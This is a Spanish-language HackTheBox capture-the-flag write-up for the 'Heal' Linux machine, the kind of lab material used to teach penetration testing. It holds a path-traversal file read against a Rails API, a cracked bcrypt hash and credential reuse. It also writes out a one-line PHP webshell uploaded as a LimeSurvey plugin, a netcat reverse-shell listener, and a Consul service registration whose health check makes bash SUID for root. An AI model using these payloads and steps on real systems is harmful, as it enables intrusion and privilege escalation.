@@ -1,0 +1,701 @@
+---
+title: "Máquina Heal"
+description: "Resolución de la máquina Heal de HackTheBox"
+tags: ["Arbitrary File Read", "Webshell upload", "consul"]
+categories: ["HackTheBox", "Medium", "Linux"]
+logo: "/assets/writeups/heal/logo.webp"
+---
+
+Una API programada en el framework Ruby On Rails posee una vulnerabilidad que nos permitirá leer archivos de la máquina, incluyendo la propia base de datos del sitio. Utilizaremos esto para obtener credenciales y tomar control de todo el servidor.
+
+## Reconocimiento
+
+La máquina tiene dos puertos abiertos:
+
+```bash
+# Nmap 7.95 scan initiated Sat Dec 14 15:01:53 2024 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv -n 10.129.39.179
+Nmap scan report for 10.129.39.179
+Host is up, received user-set (0.68s latency).
+Scanned at 2024-12-14 15:01:53 -04 for 183s
+Not shown: 57422 closed tcp ports (reset), 8111 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Dec 14 15:04:57 2024 -- 1 IP address (1 host up) scanned in 183.90 seconds
+```
+
+El sitio web, `heal.htb`, es una interfaz web para crear curriculums de forma sencilla según la propia app:
+
+![Web](/assets/writeups/heal/1.png)
+
+Al intentar registrarnos primero no nos dejará ya que el sitio intentará comunicarse con el host `api.heal.htb` que agregaremos también a nuestro archivo de hosts. Luego de hacerlo y acceder, el sitio nos da varias opciones:
+
+![Web panel](/assets/writeups/heal/2.png)
+
+Veamos que hacemos por acá.
+
+## Intrusión
+
+### www-data - heal
+
+Al final del todo, tendremos un botón para exportar el curriculum a PDF que hace la siguiente petición HTTP:
+
+```bash
+POST /exports HTTP/1.1
+Host: api.heal.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Authorization: Bearer ...
+Content-Length: 2579
+Origin: http://heal.htb
+DNT: 1
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://heal.htb/
+Priority: u=0
+
+... [snip]
+```
+
+Es una petición con un cuerpo JSON con el contenido HTML del curriculum a ser procesado. Esto da indicios de que se puede estar usando `wkhtmltopdf` pero no nos servirá de mucho por algo que veremos luego. Luego de esta petición hay otra para descargar el resultado:
+
+```bash
+GET /download?filename=59e25224022e64ff806b.pdf HTTP/1.1
+Host: api.heal.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Bearer ...
+Origin: http://heal.htb
+DNT: 1
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://heal.htb/
+```
+
+Si cambiamos el parámetro `filename` a algo como `/etc/passwd` veremos que:
+
+```bash
+❯ curl -v -H "Authorization: Bearer ..." "http://api.heal.htb/download?filename=/etc/passwd"
+* Host api.heal.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.46
+*   Trying 10.10.11.46:80...
+* Connected to api.heal.htb (10.10.11.46) port 80
+* using HTTP/1.x
+> GET /download?filename=/etc/passwd HTTP/1.1
+> Host: api.heal.htb
+> User-Agent: curl/8.13.0
+> Accept: */*
+> Authorization: Bearer ...
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Wed, 21 May 2025 21:06:04 GMT
+< Content-Type: application/octet-stream
+< Content-Length: 2120
+< Connection: keep-alive
+< x-frame-options: SAMEORIGIN
+< x-xss-protection: 0
+< x-content-type-options: nosniff
+< x-permitted-cross-domain-policies: none
+< referrer-policy: strict-origin-when-cross-origin
+< content-disposition: attachment; filename="passwd"; filename*=UTF-8''passwd
+< content-transfer-encoding: binary
+< cache-control: no-cache
+< x-request-id: 7b3f1371-f0c8-4d11-9f3e-aee9aaf7a918
+< x-runtime: 0.006832
+< vary: Origin
+< 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+... [snip]
+```
+
+¡La API es vulnerable a lectura arbitraria de archivos!
+
+Vemos cosas como la existencia de un usuario `ron` en el sistema, pero nada que nos pueda ayudar a entrar en el sistema aún. Sin embargo, si vemos el index de la API veremos que:
+
+![Rails](/assets/writeups/heal/3.png)
+
+Se trata de un Ruby On Rails, por lo que debe haber un Gemfile en la raíz del proyecto:
+
+```bash
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Wed, 21 May 2025 21:11:00 GMT
+< Content-Type: application/octet-stream
+< Content-Length: 1595
+< Connection: keep-alive
+< x-frame-options: SAMEORIGIN
+< x-xss-protection: 0
+< x-content-type-options: nosniff
+< x-permitted-cross-domain-policies: none
+< referrer-policy: strict-origin-when-cross-origin
+< content-disposition: attachment; filename="Gemfile"; filename*=UTF-8''Gemfile
+< content-transfer-encoding: binary
+< cache-control: no-cache
+< x-request-id: 716e803d-0871-416a-83eb-09008324d67f
+< x-runtime: 0.003553
+< vary: Origin
+< 
+source "https://rubygems.org"
+
+ruby "3.3.5"
+
+# Bundle edge Rails instead: gem "rails", github: "rails/rails", branch: "main"
+gem "rails", "~> 7.1.3", ">= 7.1.3.4"
+
+# Use sqlite3 as the database for Active Record
+gem "sqlite3", "~> 1.4"
+... [snip]
+```
+
+Entonces, las rutas están en los archivos de configuración `config/routes.rb`:
+
+```ruby
+Rails.application.routes.draw do
+  get '/', to: 'rails/welcome#index'
+  post 'signup', to: 'authentication#signup'
+  post 'signin', to: 'authentication#signin'
+  get 'profile', to: 'authentication#profile'
+  get 'resume', to: 'authentication#resume'
+  delete 'logout', to: 'authentication#logout'
+  post 'exports', to: 'exports#create'
+  get 'download', to: 'exports#download'
+end
+```
+{: file="config/routes.rb" }
+
+Las mismas rutas que vimos al inicio, nada interesante.
+
+Viendo otras configuraciones, vemos algo peculiar:
+
+```yaml
+# SQLite. Versions 3.8.0 and up are supported.
+#   gem install sqlite3
+#
+#   Ensure the SQLite 3 gem is defined in your Gemfile
+#   gem "sqlite3"
+#
+default: &default
+  adapter: sqlite3
+  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
+  timeout: 5000
+
+development:
+  <<: *default
+  database: storage/development.sqlite3
+
+# Warning: The database defined as "test" will be erased and
+# re-generated from your development database when you run "rake".
+# Do not set this db to the same as development or production.
+test:
+  <<: *default
+  database: storage/test.sqlite3
+
+production:
+  <<: *default
+  database: storage/development.sqlite3
+* Connection #0 to host api.heal.htb left intact
+```
+{: file="config/database.yml"}
+
+Está usando SQLite3 y tenemos la ubicación de la base de datos. Extrayendo la de producción y desarrollo vemos una credencial:
+
+```bash
+sqlite> select * from users;
+1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
+2|qwerty@com|$2a$12$.koyFd.uUgwtqjsvPAdy3uzc2kFxcML87ITHd9pDJ1kJMuOy9wimG|2025-05-21 15:33:57.933134|2025-05-21 15:33:57.933134|qwerty|qwerty|0
+```
+
+El hash de la contraseña de ralph es crackeable:
+
+```bash
+❯ hashcat -m 3200 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --show
+$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
+```
+
+Pero, en el sitio no se almacena ningún dato por lo que no haremos nada con esta credencial ya que tampoco funciona por SSH... al menos en lo que ya conocemos.
+
+Hay un botón en el generador de curriculums que nos lleva a `take-survey.heal.htb`, que es una instancia de [LimeSurvey](https://www.limesurvey.org/es)
+
+![LimeSurvey](/assets/writeups/heal/4.png)
+
+Justo nos dice que hay un administrador con correo `ralph@heal.htb`, parece pertenecer al mismo que le acabamos de crackear la contraseña. Vamos a ver si reutiliza la dicha en este nuevo sitio.
+
+En `/admin` está la página de inicio de sesión para administradores, y si utilizamos las credenciales que encontramos...
+
+![Lime Dash](/assets/writeups/heal/5.png)
+
+Somos administradores, y justo esta aplicación nos permite instalar plugins. Estando programada en PHP, significa que podemos crear uno malicioso.
+
+De ejemplos de plugins en GitHub, tendremos un archivo de especificación (o configuración) de plugins de ejemplo, como puede ser este sacado de [MassAction](https://github.com/olleharstedt/MassAction/):
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<config>
+    <metadata>
+        <name>limauwu</name>
+        <type>plugin</type>
+        <creationDate>2017-03-28</creationDate>
+        <lastUpdate>2024-09-16</lastUpdate>
+        <author>Olle Haerstedt</author>
+        <authorUrl>https://github.com/olleharstedt</authorUrl>
+        <supportUrl>https://github.com/olleharstedt/MassAction/issues</supportUrl>
+        <version>2.0.0</version>
+        <lastSecurityUpdate>1.0.0</lastSecurityUpdate>
+        <license>GNU General Public License version 2 or later</license>
+        <description><![CDATA[Edit multiple relevance equations in one page.]]></description>
+    </metadata>
+
+    <compatibility>
+        <version>6.0</version>
+    </compatibility>
+
+    <updaters>
+        <updater>
+            <stable>1</stable>
+            <type>rest</type>
+            <source>https://comfortupdate.limesurvey.org/index.php?r=limestorerest</source>
+        </updater>
+        <updater>
+            <stable>0</stable>
+            <type>git</type>
+            <source>https://github.com/myrepo/myrepo</source>
+        </updater>
+    </updaters>
+</config>
+```
+{: file="config.xml" }
+
+Con esto también agregaremos un simple archivo PHP con el siguiente contenido:
+
+```php
+<?php
+  echo system($_GET['uwu']);
+?>
+```
+{: file="test.php" }
+
+Yendo en el panel de administración a `Configuration -> Plugins -> Upload & Install`, nos pedirá un archivo zip:
+
+![Upload plugin](/assets/writeups/heal/6.png)
+
+Comprimiendo los archivos PHP y XML en un zip y luego subiéndolo con este formulario, el panel nos dirá que se ha instalado correctamente el plugin y que debemos activarlo. 
+
+Ahora, la aplicación almacena los ficheros de los plugins en `upload/plugins/<plugin_name>`, por lo que nuestro sencillo archivo PHP debe estar en `upload/plugins/<plugin_name>/<name>.php`. Y efectivamente:
+
+```bash
+❯ curl -v "http://take-survey.heal.htb/upload/plugins/limauwu/test.php?uwu=id"
+* Host take-survey.heal.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.46
+*   Trying 10.10.11.46:80...
+* Connected to take-survey.heal.htb (10.10.11.46) port 80
+* using HTTP/1.x
+> GET /upload/plugins/limauwu/test.php?uwu=id HTTP/1.1
+> Host: take-survey.heal.htb
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Wed, 21 May 2025 22:42:50 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+* Connection #0 to host take-survey.heal.htb left intact
+```
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.46 43092
+bash: cannot set terminal process group (1007): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@heal:~/limesurvey/upload/plugins/limauwu$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@heal:~/limesurvey/upload/plugins/limauwu$ ^Z
+[1]  + 20240 suspended  nc -lvnp 443
+
+❯ stty raw -echo; fg
+[1]  + 20240 continued  nc -lvnp 443
+                                    export TERM=xterm-256color
+www-data@heal:~/limesurvey/upload/plugins/limauwu$ stty rows 34 columns 149
+www-data@heal:~/limesurvey/upload/plugins/limauwu$ source /etc/skel/.bashrc
+```
+
+### ron - heal
+
+En los archivos de configuración de LimeSurvey, encontraremos esto en las credenciales de la base de datos:
+
+```php
+<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
+/*
+| -------------------------------------------------------------------
+| DATABASE CONNECTIVITY SETTINGS
+| -------------------------------------------------------------------
+| This file will contain the settings needed to access your database.
+|
+| For complete instructions please consult the 'Database Connection'
+| page of the User Guide.
+|
+| -------------------------------------------------------------------
+| EXPLANATION OF VARIABLES
+| -------------------------------------------------------------------
+|
+|    'connectionString' Hostname, database, port and database type for 
+|     the connection. Driver example: mysql. Currently supported:
+|                 mysql, pgsql, mssql, sqlite, oci
+|    'username' The username used to connect to the database
+|    'password' The password used to connect to the database
+|    'tablePrefix' You can add an optional prefix, which will be added
+|                 to the table name when using the Active Record class
+|
+*/
+return array(
+	'components' => array(
+		'db' => array(
+			'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
+			'emulatePrepare' => true,
+			'username' => 'db_user',
+			'password' => 'AdmiDi0_pA$$w0rd',
+			'charset' => 'utf8',
+			'tablePrefix' => 'lime_',
+		),
+		
+		'session' => array (
+			'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
+			// Uncomment the following lines if you need table-based sessions.
+			// Note: Table-based sessions are currently not supported on MSSQL server.
+			// 'class' => 'application.core.web.DbHttpSession',
+			// 'connectionID' => 'db',
+			// 'sessionTableName' => '{{sessions}}',
+		),
+		
+		'urlManager' => array(
+			'urlFormat' => 'path',
+			'rules' => array(
+				// You can add your own rules here
+			),
+			'showScriptName' => true,
+		),
+	
+		// If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
+		//'request' => array(
+		//	'baseUrl' => '/limesurvey',
+		//),
+	),
+	// For security issue : it's better to set runtimePath out of web access
+	// Directory must be readable and writable by the webuser
+	// 'runtimePath'=>'/var/limesurvey/runtime/'
+	// Use the following config variable to set modified optional settings copied from config-defaults.php
+	'config'=>array(
+	// debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
+	// then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
+	// on your webspace.
+	// LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
+		'debug'=>0,
+		'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2
+
+		// If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
+		// public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
+		//'publicurl' => 'https://www.example.org/limesurvey',
+
+		// Update default LimeSurvey config here
+	)
+);
+/* End of file config.php */
+/* Location: ./application/config/config.php */
+```
+{: file="/var/www/limesurvey/application/config/config.php" }
+
+Como hemos visto por la lectura arbitraria de archivos, hay un usuario llamado `ron`:
+
+```bash
+www-data@heal:~/limesurvey/application/config$ ls -la /home
+total 16
+drwxr-xr-x  4 root  root  4096 Dec  9 12:53 .
+drwxr-xr-x 19 root  root  4096 Dec  8 13:57 ..
+drwxr-x--- 13 ralph ralph 4096 Dec  9 12:57 ralph
+drwxr-x---  3 ron   ron   4096 Dec  9 15:13 ron
+```
+
+Esta contraseña de la base de datos sirve para el mismo.
+
+```bash
+www-data@heal:~/limesurvey/application/config$ su ron
+Password: 
+ron@heal:/var/www/limesurvey/application/config$
+```
+
+En el directorio personal de este usuario encontraremos la primera flag.
+
+```bash
+ron@heal:~$ ls -al
+total 28
+drwxr-x--- 3 ron  ron  4096 Dec  9 15:13 .
+drwxr-xr-x 4 root root 4096 Dec  9 12:53 ..
+lrwxrwxrwx 1 root root    9 Dec  9 12:57 .bash_history -> /dev/null
+-rw-r--r-- 1 ron  ron   220 Dec  9 12:53 .bash_logout
+-rw-r--r-- 1 ron  ron  3771 Dec  9 12:53 .bashrc
+drwx------ 2 ron  ron  4096 Dec  9 15:13 .cache
+-rw-r--r-- 1 ron  ron   807 Dec  9 12:53 .profile
+-rw-r----- 1 root ron    33 May 21 15:31 user.txt
+ron@heal:~$ cat user.txt
+43edc3585d509938ebee8b027d******
+```
+
+## Escalada de privilegios
+
+Hay un consul en escucha únicamente por las direcciones internas de la máquina:
+
+```bash
+ron@heal:/$ ps -faux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+... [snip]
+root        2713  0.7  2.5 1357540 103132 ?      Ssl  15:34   3:13 /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data
+```
+
+[Consul](https://developer.hashicorp.com/consul) es un software para manejar las conexiones entre los servicios de software de forma automatizada.
+
+Buscando información acerca de, podemos ver que en el puerto `8500` está en escucha la API REST del mismo, y probando por el endpoint `/v1/catalog/services`:
+
+```bash
+ron@heal:/$ curl -v http://127.0.0.1:8500/v1/catalog/services; echo
+*   Trying 127.0.0.1:8500...
+* Connected to 127.0.0.1 (127.0.0.1) port 8500 (#0)
+> GET /v1/catalog/services HTTP/1.1
+> Host: 127.0.0.1:8500
+> User-Agent: curl/7.81.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Content-Type: application/json
+< Vary: Accept-Encoding
+< X-Consul-Default-Acl-Policy: allow
+< X-Consul-Effective-Consistency: leader
+< X-Consul-Index: 13
+< X-Consul-Knownleader: true
+< X-Consul-Lastcontact: 0
+< X-Consul-Query-Backend: blocking-query
+< Date: Wed, 21 May 2025 23:01:11 GMT
+< Content-Length: 71
+< 
+* Connection #0 to host 127.0.0.1 left intact
+{"Heal React APP":[],"PostgreSQL":[],"Ruby API service":[],"consul":[]}
+```
+
+Es una lista de los servicios que están configurados en el consul. Además, el poder hacer una petición a la lista de servicios nos dice que probablemente no necesitaremos de autenticación para usar el resto de endpoints (también hay que mirar el header `X-Consul-Default-Acl-Policy`).
+
+Buscando por endpoints que nos permitan hacer cositas, encontramos uno que nos permite registrar un servicio en un agente:
+
+> PUT `/agent/service/register`
+>
+> This endpoint adds a new service, with optional health checks, to the local agent.
+>
+> The agent is responsible for managing the status of its local services, and for sending updates about its local services to the servers to keep the global catalog in sync.
+
+En el objeto del servicio, podemos ver que hay un sub-árbol llamado `Check`, que nos permite especificar un comando que se ejecutará para comprobar que el servicio sigue con vida. Podemos copiarnos el propio ejemplo que da Hashicorp y cambiarlo por algo malicioso:
+
+```json
+{
+  "ID": "redis1",
+  "Name": "redis",
+  "Tags": ["primary", "v1"],
+  "Address": "127.0.0.1",
+  "Port": 8000,
+  "Meta": {
+    "redis_version": "4.0"
+  },
+  "EnableTagOverride": false,
+  "Check": {
+    "DeregisterCriticalServiceAfter": "1m",
+    "Args": ["/tmp/test.sh"],
+    "Interval": "10s",
+    "Timeout": "5s"
+  },
+  "Weights": {
+    "Passing": 10,
+    "Warning": 1
+  }
+}
+```
+{: file="redis.json" }
+
+Luego de crear un script en `/tmp/test.sh` que haga la bash SUID por ejemplo, enviaremos la respectiva petición a Consul para registrar el servicio.
+
+```bash
+ron@heal:/tmp$ curl \
+    --request PUT \
+    --data @test.json -v \
+    http://127.0.0.1:8500/v1/agent/service/register?replace-existing-checks=true
+*   Trying 127.0.0.1:8500...
+* Connected to 127.0.0.1 (127.0.0.1) port 8500 (#0)
+> PUT /v1/agent/service/register?replace-existing-checks=true HTTP/1.1
+> Host: 127.0.0.1:8500
+> User-Agent: curl/7.81.0
+> Accept: */*
+> Content-Length: 355
+> Content-Type: application/x-www-form-urlencoded
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Vary: Accept-Encoding
+< X-Consul-Default-Acl-Policy: allow
+< Date: Wed, 21 May 2025 23:16:17 GMT
+< Content-Length: 0
+< 
+* Connection #0 to host 127.0.0.1 left intact
+```
+
+Luego de un ratito, veremos que:
+
+```bash
+ron@heal:/tmp$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+```
+
+Por lo que ya podemos tomar la última flag.
+
+```bash
+ron@heal:/tmp$ bash -p
+bash-5.1# cd /root
+bash-5.1# ls -la
+total 52
+drwx------  7 root root 4096 May 21 15:31 .
+drwxr-xr-x 19 root root 4096 Dec  8 13:57 ..
+lrwxrwxrwx  1 root root    9 Nov 29 11:50 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwxr-xr-x  3 root root 4096 Dec  8 13:57 .bundle
+drwxr-xr-x  3 root root 4096 Dec  8 13:57 .cache
+-rwxr-xr-x  1 root root  658 Sep 27  2024 cleanup-consul.sh
+drwxr-xr-x  3 root root 4096 Dec  8 13:57 .config
+-rwxr-xr-x  1 root root  863 Oct  7  2024 consul-up.sh
+drwxr-xr-x  3 root root 4096 Dec  8 13:57 .local
+-rwxr-xr-x  1 root root  585 Dec  4 10:09 plugin_cleanup.sh
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r-----  1 root root   33 May 21 15:31 root.txt
+drwx------  2 root root 4096 Dec  8 13:57 .ssh
+bash-5.1# cat root.txt
+8b60d4f3c7d4c3ebed7df34ecb******
+```
+
+## Extra
+
+El código de las rutas de la API para exportar los curriculums es el siguiente:
+
+```ruby
+require 'rexml/document'
+require 'imgkit'
+require 'open3'
+
+class ExportsController < ApplicationController
+  before_action :authorize_request
+
+  def create
+    html_content = params[:content]
+    format = params[:format] || 'png'
+    css_path = Rails.root.join('app', 'assets', 'stylesheets', 'styles.css').to_s
+    
+    filename = "#{SecureRandom.hex(10)}.#{format}"
+    filepath = Rails.root.join('private', 'exports', filename)
+
+    if format == 'pdf'
+      generate_pdf(html_content, filepath, css_path)
+    else
+      generate_png(html_content, filepath, css_path)
+    end
+
+    render json: { message: "#{format.upcase} created successfully", filename: filename }, status: :created
+  end
+
+
+  def download
+    begin
+      file_path = Rails.root.join('private', 'exports', params[:filename])
+      send_file(file_path, disposition: 'attachment')
+    rescue ActionController::MissingFile
+      render json: { errors: 'File not found' }, status: :not_found
+    rescue StandardError => e
+      render json: { errors: "Error downloading file: #{e.message}" }, status: :internal_server_error
+    end
+  end
+
+
+  private
+
+  def authorize_request
+    header = request.headers['Authorization']
+    header = header.split(' ').last if header
+    begin
+      decoded = JWT.decode(header, Rails.application.credentials.secret_key_base, true, { algorithm: 'HS256' })[0]
+      @current_user = User.find(decoded['user_id'])
+    rescue JWT::DecodeError
+      render json: { errors: 'Invalid token' }, status: :unauthorized
+    rescue ActiveRecord::RecordNotFound
+      render json: { errors: 'Invalid token' }, status: :unauthorized
+    end
+  end
+
+  def get_mime_type(filepath)
+    case File.extname(filepath)
+    when '.pdf'
+      'application/pdf'
+    when '.png'
+      'image/png'
+    else
+      'application/octet-stream'
+    end
+  end
+
+  def generate_pdf(html_content, filepath, css_path)
+    command = "wkhtmltopdf --proxy None --user-style-sheet #{css_path} - #{filepath}"
+    Open3.popen3(command) do |stdin, stdout, stderr, wait_thr|
+      stdin.write(html_content)
+      stdin.close
+
+      exit_status = wait_thr.value
+      unless exit_status.success?
+        raise "Error generating PDF: #{stderr.read}"
+      end
+    end
+  end
+
+  def generate_png(html_content, filepath, css_path)
+    kit = IMGKit.new(html_content, quality: 50)
+    kit.stylesheets << css_path
+    png = kit.to_img(:png)
+    File.open(filepath, 'wb') do |file|
+      file.write(png)
+    end
+  end
+end
+```
+{: file="/home/ralph/resume_api/app/controllers/exports_controller.rb" }
+
+Si miras bien, esto ejecuta el `wkhtmltopdf` con el argumento `--proxy None`, lo que básicamente hace que el programa trabaje como si no tuviese conexión a internet. Por lo que cualquier intento de SSRF acá no iba a funcionar.
